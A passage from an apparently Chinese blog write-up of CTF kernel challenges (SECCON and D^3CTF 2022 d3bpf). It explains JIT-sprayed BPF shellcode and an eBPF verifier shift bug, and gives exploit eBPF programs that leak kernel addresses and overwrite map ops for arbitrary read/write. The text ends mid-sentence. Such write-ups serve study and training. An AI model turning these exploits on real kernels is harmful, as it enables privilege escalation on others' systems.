aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;pre&gt;&lt;code&gt;mkdir initramfs&#xD;&#xA;cd initramfs&#xD;&#xA;cp ../rootfs.cpio .&#xD;&#xA;sudo cpio -idm &amp;lt; ./rootfs.cpio&#xD;&#xA;rm rootfs.cpio&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;gcc exp.c -static -masm=intel -g -o ./initramfs/exp&#xD;&#xA;cd ./initramfs&#xD;&#xA;sudo find . | sudo cpio -o --format=newc &amp;gt;../rootfs.cpio&#xD;&#xA;cd ..&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提供了一个新的系统调用，能控制rip，但是其他寄存器都置0&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Added to arch/x86/entry/syscalls/syscall_64.tbl:&#xD;&#xA;1337 64 seccon sys_seccon&#xD;&#xA;&#xD;&#xA;Added to kernel/sys.c:&#xD;&#xA;SYSCALL_DEFINE1(seccon, unsigned long, rip)&#xD;&#xA;{&#xD;&#xA;  asm volatile(&amp;#34;xor %%edx, %%edx;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%ebx, %%ebx;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%ecx, %%ecx;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%edi, %%edi;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%esi, %%esi;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%r8d, %%r8d;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%r9d, %%r9d;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%r10d, %%r10d;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%r11d, %%r11d;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%r12d, %%r12d;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%r13d, %%r13d;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%r14d, %%r14d;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%r15d, %%r15d;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%ebp, %%ebp;&amp;#34;&#xD;&#xA;               &amp;#34;xor %%esp, %%esp;&amp;#34;&#xD;&#xA;               &amp;#34;jmp %0;&amp;#34;&#xD;&#xA;               &amp;#34;ud2;&amp;#34;&#xD;&#xA;               : : &amp;#34;rax&amp;#34;(rip));&#xD;&#xA;  return 0;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;大概思路就是往内核中写入一个one_gadget，调用它就能提权&lt;/p&gt;&#xA;&lt;p&gt;同时，题目也禁掉了bpf系统调用&lt;/p&gt;&#xA;&lt;p&gt;写了个exp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;&#xD;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xD;&#xA;#include &amp;lt;sys/syscall.h&amp;gt;&#xD;&#xA;#include &amp;lt;errno.h&amp;gt;&#xD;&#xA;&#xD;&#xA;int main() {&#xD;&#xA;    // 尝试调用 bpf 系统调用&#xD;&#xA;    long ret = syscall(321, 0, 0, 0); // 321 是 x64 下 bpf 的调用号&#xD;&#xA;    if (ret == -1 &amp;amp;&amp;amp; errno == ENOSYS) {&#xD;&#xA;        printf(&amp;#34;内核不支持该系统调用 (ENOSYS)\n&amp;#34;);&#xD;&#xA;    } else {&#xD;&#xA;        printf(&amp;#34;内核支持该系统调用，返回值为: %ld\n&amp;#34;, ret);&#xD;&#xA;    }&#xD;&#xA;    return 0;&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;/ $ ./exp&#xD;&#xA;内核不支持该系统调用 (ENOSYS)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;/ # cat /proc/sys/net/core/bpf_jit_enable&#xD;&#xA;1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;来自AI：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;如果是：&#xD;&#xA;&#xD;&#xA;2 → 致盲开启，老套路基本死&#xD;&#xA;1 → 还能打&#xD;&#xA;0 → 先想办法打开 JIT&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;没开致盲&lt;/p&gt;&#xA;&lt;p&gt;但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。&lt;/p&gt;&#xA;&lt;p&gt;所以，思路就是使用&lt;code&gt;prctl&lt;/code&gt;写入一段bpf程序到内核中，调用&lt;code&gt;seccon&lt;/code&gt;系统调用，控制&lt;code&gt;rip&lt;/code&gt;执行这段我们自定义的程序来提权&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;程序怎么写？&lt;/li&gt;&#xA;&lt;li&gt;怎么执行到这段程序？&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;编写shellcode&#34;&gt;&lt;span&gt;编写shellcode&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%bc%96%e5%86%99shellcode&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;ul&gt;&#xA;&lt;li&gt;开了&lt;code&gt;smep&lt;/code&gt;、&lt;code&gt;smap&lt;/code&gt;保护，需要写&lt;code&gt;cr4&lt;/code&gt;寄存器为&lt;code&gt;0x6f0&lt;/code&gt;来绕过&lt;/li&gt;&#xA;&lt;li&gt;开了&lt;code&gt;kpti&lt;/code&gt;，通过执行&lt;code&gt;swapgs_restore_regs_and_return_to_usermode&lt;/code&gt;，切换页表后返回用户态提权&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;写入的指令需要是&lt;code&gt;ebpf&lt;/code&gt;格式，经过&lt;code&gt;jit&lt;/code&gt;编译后，是x86指令&lt;/p&gt;&#xA;&lt;p&gt;这里两篇参考文章构造的&lt;code&gt;ebpf&lt;/code&gt;指令格式都是，&lt;code&gt;p32(0)+p32(A)&lt;/code&gt;，经过&lt;code&gt;jit&lt;/code&gt;编译后他会变成&lt;code&gt;0xb8+p32(A)&lt;/code&gt;存入内存中&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;这里的&lt;code&gt;ebpf&lt;/code&gt;指令的&lt;code&gt;opcode&lt;/code&gt;被设置为0，其实是设置成了&lt;code&gt;BPF_LD | BPF_IMM | BPF_W&lt;/code&gt;，也就是&lt;code&gt;ldw&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; x/32b 0xffffffffc00005d0&#xD;&#xA;0xffffffffc00005d0:     0x48    0x89    0xc7    0x04    0xb8    0x58    0x90    0xeb&#xD;&#xA;0xffffffffc00005d8:     0x01    0xb8    0xff    0xd0    0xeb    0x01    0xb8    0x58&#xD;&#xA;0xffffffffc00005e0:     0x90    0xeb    0x01    0xb8    0xff    0xe0    0xeb    0x01&#xD;&#xA;0xffffffffc00005e8:     0xb8    0x90    0x90    0xeb    0x01    0xb8    0x90    0x90&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;每两个A直接间隔一个&lt;code&gt;0xb8&lt;/code&gt;，跳过&lt;code&gt;0xb8&lt;/code&gt;的思路有两种：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;写A中的一个字节为&lt;code&gt;0x3c&lt;/code&gt;和&lt;code&gt;0xb8&lt;/code&gt;组成 &lt;code&gt;cmp al, 0xb8&lt;/code&gt;：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    内存            x86&#xD;&#xA;0xb0 0x12       mov al, 0x12&#xD;&#xA;0x90            nop&#xD;&#xA;0x3c 0xb8       cmp al, 0xb8    ;用0x3c吃掉一个0xb8&#xD;&#xA;0xb4 0x34       mov ah, 0x34&#xD;&#xA;0x90            nop&#xD;&#xA;0x3c ...        ...            ;继续吃掉下一个0xb8&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;写A中的两个字节为&lt;code&gt;0xeb 0x01&lt;/code&gt;（PC = PC+1），来跳过&lt;code&gt;0xb8&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;    内存            x86&#xD;&#xA;0xb0 0x12        mov al, 0x12  &#xD;&#xA;0xeb 0x01        jmp $&amp;#43;3            ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC&amp;#43;1&#xD;&#xA;0xb8&#xD;&#xA;0xb4 0x34        mov ah, 0x34&#xD;&#xA;0xeb 0x01        jmp $&amp;#43;3&#xD;&#xA;...&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;d3ctf-2022__d3bpf&#34;&gt;&lt;span&gt;D^3CTF 2022__d3bpf&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#d3ctf-2022__d3bpf&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;内核ebpf&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;这里的&lt;code&gt;bzImage&lt;/code&gt;可以直接用&lt;code&gt;vmlinux-to-elf&lt;/code&gt;提取&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;patch&lt;/code&gt;后，如果对一个寄存器右移的位数大于&lt;code&gt;insn_bitness&lt;/code&gt;（ALU32运算为32，ALU64为64），则&lt;code&gt;verifier&lt;/code&gt;认为该寄存器全部&lt;code&gt;bit&lt;/code&gt;已知（补充：指针不可以与标记为&lt;code&gt;unknown&lt;/code&gt;的寄存器进行ALU运算），且&lt;code&gt;verifier&lt;/code&gt;认为其值为0&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c&#xD;&#xA;index 37581919e..8e98d4af5 100644&#xD;&#xA;--- a/kernel/bpf/verifier.c&#xD;&#xA;&amp;#43;&amp;#43;&amp;#43; b/kernel/bpf/verifier.c&#xD;&#xA;@@ -6455,11 &amp;#43;6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,&#xD;&#xA; &#x9;&#x9;&#x9;scalar_min_max_lsh(dst_reg, &amp;amp;src_reg);&#xD;&#xA; &#x9;&#x9;break;&#xD;&#xA; &#x9;case BPF_RSH:&#xD;&#xA;-&#x9;&#x9;if (umax_val &amp;gt;= insn_bitness) {&#xD;&#xA;-&#x9;&#x9;&#x9;/* Shifts greater than 31 or 63 are undefined.&#xD;&#xA;-&#x9;&#x9;&#x9; * This includes shifts by a negative number.&#xD;&#xA;-&#x9;&#x9;&#x9; */&#xD;&#xA;-&#x9;&#x9;&#x9;mark_reg_unknown(env, regs, insn-&amp;gt;dst_reg);&#xD;&#xA;&amp;#43;&#x9;&#x9;if (umin_val &amp;gt;= insn_bitness) {&#xD;&#xA;&amp;#43;&#x9;&#x9;&#x9;if (alu32)&#xD;&#xA;&amp;#43;&#x9;&#x9;&#x9;&#x9;__mark_reg32_known(dst_reg, 0);&#xD;&#xA;&amp;#43;&#x9;&#x9;&#x9;else&#xD;&#xA;&amp;#43;&#x9;&#x9;&#x9;&#x9;__mark_reg_known_zero(dst_reg);&#xD;&#xA; &#x9;&#x9;&#x9;break;&#xD;&#xA; &#x9;&#x9;}&#xD;&#xA; &#x9;&#x9;if (alu32)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把这个&lt;code&gt;patch&lt;/code&gt;翻译一下：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;BPF_MOV64_IMM(BPF_REG_0, 0x1337),&#xD;&#xA;BPF_MOV64_IMM(BPF_REG_1, 64),&#xD;&#xA;BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),&#xD;&#xA;BPF_EXIT_INSN()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么，&lt;code&gt;verifier&lt;/code&gt;就会认为这个&lt;code&gt;reg0&lt;/code&gt;为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数&lt;code&gt;&amp;amp;63&lt;/code&gt;，所以实际上CPU执行的运算是&lt;code&gt;0x1337 &amp;gt;&amp;gt; 0&lt;/code&gt;。&lt;/p&gt;&#xA;&lt;p&gt;这里就伪造了一个绕过&lt;code&gt;verifier&lt;/code&gt;检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;任意地址读写&#34;&gt;&lt;span&gt;任意地址读写&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e4%bb%bb%e6%84%8f%e5%9c%b0%e5%9d%80%e8%af%bb%e5%86%99&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;p&gt;写入&lt;code&gt;array_map_update_elem &lt;/code&gt;、&lt;code&gt;ARRAY_MAP_LOOKUP_ELEM&lt;/code&gt;、&lt;code&gt;array_of_map_gen_lookup&lt;/code&gt;、&lt;code&gt;array_map_free&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;array_of_map_gen_lookup&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;有个&lt;code&gt;map&lt;/code&gt;类型是&lt;code&gt;BPF_MAP_TYPE_ARRAY_OF_MAPS&lt;/code&gt;，它是一个存储&lt;code&gt;map&lt;/code&gt;的数组，它的&lt;code&gt;lookup_elem&lt;/code&gt;函数会解引用两次&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static void *array_of_map_lookup_elem(struct bpf_map *map, void *key)&#xD;&#xA;{&#xD;&#xA;&#x9;struct bpf_map **inner_map = array_map_lookup_elem(map, key);&#xD;&#xA;&#xD;&#xA;&#x9;if (!inner_map)&#xD;&#xA;&#x9;&#x9;return NULL;&#xD;&#xA;&#xD;&#xA;&#x9;return READ_ONCE(*inner_map);&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;把&lt;code&gt;map_lookup_elem&lt;/code&gt;改成&lt;code&gt;array_of_map_gen_lookup&lt;/code&gt;后，使用 &lt;code&gt;lookup_element&lt;/code&gt;时&lt;code&gt;verifier&lt;/code&gt;会认为它返回了一个指向&lt;code&gt;map_value&lt;/code&gt;的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西&lt;/p&gt;&#xA;&lt;h5 class=&#34;heading-element&#34; id=&#34;思路流程&#34;&gt;&lt;span&gt;思路流程&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%80%9d%e8%b7%af%e6%b5%81%e7%a8%8b&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;ul&gt;&#xA;&lt;li&gt;先初始化&lt;code&gt;stack-4&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;保存r1中存的&lt;code&gt;ctx&lt;/code&gt;到r6，后续需要使用到&lt;code&gt;ctx&lt;/code&gt;就会到r6中找&lt;/li&gt;&#xA;&lt;li&gt;调用辅助函数&lt;code&gt;BPF_FUNC_map_lookup_elem&lt;/code&gt;，第一个参数为执行&lt;code&gt;map&lt;/code&gt;的指针，第二个参数为&lt;code&gt;key&lt;/code&gt;，值为0。返回值存在r0，为一个指向&lt;code&gt;value&lt;/code&gt;域的地址（&lt;code&gt;struct bpf_array&lt;/code&gt;）&lt;/li&gt;&#xA;&lt;li&gt;调用完辅助函数后，&lt;code&gt;verifier&lt;/code&gt;认为r0中的值的类型为&lt;code&gt;PTR_TO_MAP_VALUE_OR_NULL&lt;/code&gt;，要对他进行非0验证，让他收敛（refine）成&lt;code&gt;PTR_TO_MAP_VALUE&lt;/code&gt;才能进行解引用或者其他一些操作&lt;/li&gt;&#xA;&lt;li&gt;构造一个绕过&lt;code&gt;verifier&lt;/code&gt;检测的寄存器，让他指向&lt;code&gt;value - 0x110&lt;/code&gt;这个地方，也就是虚表指针&lt;/li&gt;&#xA;&lt;li&gt;把他写回&lt;code&gt;value&lt;/code&gt;域，泄露出来&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;    struct bpf_insn kleak_prog[] = {&#xD;&#xA;        // load map_ptr_or_null in BPF_REG_0&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr &amp;#43; 0x110 (offset of .values in array_map)&#xD;&#xA;        &#xD;&#xA;        // map_ptr_or_null -&amp;gt; map_ptr&#xD;&#xA;        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        // trigger vuln and make eBPF think we are still map_ptr &amp;#43; 0x110 but in reality we&amp;#39;re map_ptr &amp;#43; 0x0&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),&#xD;&#xA;        // ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used hence any value can be used&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0x110),&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_1, 64),&#xD;&#xA;        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), // the bug&#xD;&#xA;        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),&#xD;&#xA;        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), // load the ptr (kbase leak)&#xD;&#xA;&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0xc0), // map_ptr &amp;#43; 0x0 -&amp;gt; map_ptr &amp;#43; 0xc0&#xD;&#xA;        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_7, 0), // load the ptr (heap leak)&#xD;&#xA;&#xD;&#xA;        // write the read ptr to map for reading it from userspace&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x50), // make map_ptr &amp;#43; 0xc0 to map_ptr &amp;#43; 0x110&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // write array_map_ops ptr to maps_ptr &amp;#43; 0x110&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_9, 8), // write *(map_ptr &amp;#43; 0xc0) to maps_ptr &amp;#43; 0x118&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;    };&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;获取&lt;code&gt;oob_map&lt;/code&gt;的&lt;code&gt;value&lt;/code&gt;地址，在其中伪造&lt;code&gt;fake_ops&lt;/code&gt;，主要写入&lt;code&gt;array_map_update_elem &lt;/code&gt;、&lt;code&gt;ARRAY_MAP_LOOKUP_ELEM&lt;/code&gt;、&lt;code&gt;array_of_map_gen_lookup&lt;/code&gt;、&lt;code&gt;array_map_free&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;改&lt;code&gt;arb_read_write_map&lt;/code&gt;的&lt;code&gt;ops&lt;/code&gt;指向&lt;code&gt;fake_ops&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;    struct bpf_insn overwrite_ops[] = {&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),&#xD;&#xA;&#xD;&#xA;        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        // setup fake bpf_map_ops struct with only needed values&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), // move map_ptr &amp;#43; 0x110&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, kbase &amp;#43; ARRAY_MAP_UPDATE_ELEM_OFFSET),&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x60),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, kbase &amp;#43; ARRAY_MAP_LOOKUP_ELEM_OFFSET),&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x58),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, kbase &amp;#43; 0x20e9c0), // array_of_map_gen_lookup&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 19 * 8),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, kbase &amp;#43; 0x20eff0), // array_map_free&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 3 * 8),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // get values ptr&#xD;&#xA;&#xD;&#xA;        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),&#xD;&#xA;&#xD;&#xA;        // trigger vuln&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0x110),&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_1, 64),&#xD;&#xA;        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),&#xD;&#xA;        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),&#xD;&#xA;&#xD;&#xA;        BPF_LD_IMM64(BPF_REG_0, map_ptr_values),&#xD;&#xA;&#xD;&#xA;        // overwrite map_ops with oob_map_ptr&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),&#xD;&#xA;&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;    };&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;把&lt;code&gt;arb_read_write_map&lt;/code&gt;的&lt;code&gt;value&lt;/code&gt;地址存到r8，&lt;code&gt;info_map&lt;/code&gt;的&lt;code&gt;value&lt;/code&gt;地址存到r9&lt;/li&gt;&#xA;&lt;li&gt;通过&lt;code&gt;BPF_LD_ABS(BPF_B, 